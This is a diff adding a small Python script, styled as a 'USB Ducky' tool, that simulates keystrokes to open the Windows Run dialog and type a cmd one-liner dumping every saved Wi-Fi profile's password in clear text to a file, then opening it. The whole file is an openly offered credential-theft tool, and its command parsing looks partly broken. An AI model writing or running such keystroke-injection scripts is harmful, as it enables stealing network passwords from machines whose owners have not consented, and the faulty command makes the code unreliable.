@@ -1,0 +1,40 @@
+import time
+from pynput.keyboard import Key, Controller
+
+keyboard = Controller()
+
+ascii_art = """
+██╗░░░██╗███╗░░██╗██╗░░██╗███╗░░██╗░█████╗░░██╗░░░░░░░██╗███╗░░██╗░░███╗░░██████╗░██████╗░███████╗
+██║░░░██║████╗░██║██║░██╔╝████╗░██║██╔══██╗░██║░░██╗░░██║████╗░██║░████║░░╚════██╗╚════██╗╚════██║
+██║░░░██║██╔██╗██║█████═╝░██╔██╗██║██║░░██║░╚██╗████╗██╔╝██╔██╗██║██╔██║░░░█████╔╝░█████╔╝░░░░██╔╝
+██║░░░██║██║╚████║██╔═██╗░██║╚████║██║░░██║░░████╔═████║░██║╚████║╚═╝██║░░░╚═══██╗░╚═══██╗░░░██╔╝░
+╚██████╔╝██║░╚███║██║░╚██╗██║░╚███║╚█████╔╝░░╚██╔╝░╚██╔╝░██║░╚███║███████╗██████╔╝██████╔╝░░██╔╝░░
+░╚═════╝░╚═╝░░╚══╝╚═╝░░╚═╝╚═╝░░╚══╝░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝░░╚══╝╚══════╝╚═════╝░╚═════╝░░░╚═╝░░░
+"""
+
+print(ascii_art)
+print("🔥 Unknown1337 USB Ducky by Adit 🔥")
+print("🚀 Starting Wi-Fi password extraction...")
+
+# Tunggu 3 detik setelah USB terhubung
+time.sleep(3)
+
+# Tekan Win + R untuk membuka Run
+keyboard.press(Key.cmd)
+keyboard.press('r')
+keyboard.release('r')
+keyboard.release(Key.cmd)
+
+time.sleep(1)
+
+# Ketik perintah untuk dump password Wi-Fi dan simpan ke file
+command = 'cmd /c netsh wlan show profiles > wifi_list.txt & for /f "skip=9 tokens=1,2 delims=:" %A in (\'netsh wlan show profiles\') do @echo %B | findstr /v "All" > temp.txt & for /f "delims=" %i in (temp.txt) do netsh wlan show profile name="%i" key=clear >> wifi_passwords.txt & del temp.txt & notepad wifi_passwords.txt'
+keyboard.type(command)
+
+time.sleep(0.5)
+
+# Tekan Enter untuk menjalankan perintah
+keyboard.press(Key.enter)
+keyboard.release(Key.enter)
+
+print("✅ Wi-Fi passwords dumped successfully!")
